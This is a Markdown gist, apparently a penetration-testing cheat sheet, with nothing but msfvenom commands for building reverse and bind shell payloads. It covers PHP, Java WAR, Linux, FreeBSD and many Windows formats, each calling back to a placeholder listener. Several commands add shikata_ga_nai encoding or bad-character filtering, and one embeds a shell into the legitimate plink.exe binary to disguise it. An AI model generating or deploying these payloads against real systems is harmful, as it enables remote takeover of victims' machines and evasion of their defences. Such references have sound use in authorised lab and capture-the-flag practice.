https://gist.githubusercontent.com/dejisec/8cdc3398610d1a0a91d01c9e1fb02ea1/raw/c8eb10b796cdaf29d5eb67469b4cdd99ddb96560/msf_pay.md

- [PHP Reverse Shell](#php-reverse-shell)
- [Java WAR Reverse Shell](#java-war-reverse-shell)
- [Linux](#linux)
	- [Linux Bind Shell](#linux-bind-shell)
	- [Linux FreeBSD Reverse Shell](#linux-freebsd-reverse-shell)
	- [Linux C Reverse Shell](#linux-c-reverse-shell)
- [Windows](#windows)
	- [Windows Non Staged Reverse Shell](#windows-non-staged-reverse-shell)
	- [Windows Staged (Meterpreter) Reverse Shell](#windows-staged-meterpreter-reverse-shell)
	- [Windows Python Reverse Shell](#windows-python-reverse-shell)
	- [Windows ASP Reverse Shell](#windows-asp-reverse-shell)
	- [Windows ASPX Reverse Shell](#windows-aspx-reverse-shell)
	- [Windows JavaScript Reverse Shell With NOPS](#windows-javascript-reverse-shell-with-nops)
	- [Windows Powershell Reverse Shell](#windows-powershell-reverse-shell)
	- [Windows Reverse Shell Excluding Bad Characters](#windows-reverse-shell-excluding-bad-characters)
	- [Windows x64 bit Reverse Shell](#windows-x64-bit-reverse-shell)
	- [Windows Reverse Shell Embedded into Plink](#windows-reverse-shell-embedded-into-plink)

## [PHP Reverse Shell](#php-reverse-shell-1)
```sh
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f raw -o shell.php
```

## [Java WAR Reverse Shell](#java-war-reverse-shell-1)
```sh
msfvenom -p java/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f war -o shell.war
```

# [Linux](#linux-1)

## [Linux Bind Shell](#linux-bind-shell-1)
```sh
msfvenom -p linux/x86/shell_bind_tcp LPORT=4443 -f c -b "\x00\x0a\x0d\x20" -e x86/shikata_ga_nai
```

## [Linux FreeBSD Reverse Shell](#linux-freebsd-reverse-shell-1)
```sh
msfvenom -p bsd/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f elf -o shell.elf
```

## [Linux C Reverse Shell](#linux-c-reverse-shell-1)
```sh
msfvenom  -p linux/x86/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -e x86/shikata_ga_nai -f c
```

# [Windows](#windows-1)

## [Windows Non Staged Reverse Shell](#windows-non-staged-reverse-shell-1)
```sh
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -e x86/shikata_ga_nai -f exe -o non_staged.exe
```

## [Windows Staged (Meterpreter) Reverse Shell](#windows-staged-meterpreter-reverse-shell-1)
```sh
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4443 -e x86/shikata_ga_nai -f exe -o meterpreter.exe
```

## [Windows Python Reverse Shell](#windows-python-reverse-shell-1)
```sh
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 EXITFUNC=thread -f python -o shell.py
```

## [Windows ASP Reverse Shell](#windows-asp-reverse-shell-1)
```sh
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f asp -e x86/shikata_ga_nai -o shell.asp
```

## [Windows ASPX Reverse Shell](#windows-aspx-reverse-shell-1)
```sh
msfvenom -f aspx -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -e x86/shikata_ga_nai -o shell.aspx
```

## [Windows JavaScript Reverse Shell With NOPS](#windows-javascript-reverse-shell-with-nops-1)
```sh
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f js_le -e generic/none -n 18
```

## [Windows Powershell Reverse Shell](#windows-powershell-reverse-shell-1)
```sh
msfvenom -p windows/x64/powershell_reverse_tcp lhost=10.1.1.1 lport=444 -f psh -o r444.ps1
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -e x86/shikata_ga_nai -i 9 -f psh -o shell.ps1
```

## [Windows Reverse Shell Excluding Bad Characters](#windows-reverse-shell-excluding-bad-characters-1)
```sh
msfvenom -p windows/shell_reverse_tcp -a x86 LHOST=10.10.10.10 LPORT=4443 EXITFUNC=thread -f c -b "\x00\x04" -e x86/shikata_ga_nai
```

## [Windows x64 bit Reverse Shell](#windows-x64-bit-reverse-shell-1)
```sh
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f exe -o shell.exe
```

## [Windows Reverse Shell Embedded into Plink](#windows-reverse-shell-embedded-into-plink-1)
```sh
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o shell_reverse_msf_encoded_embedded.exe
```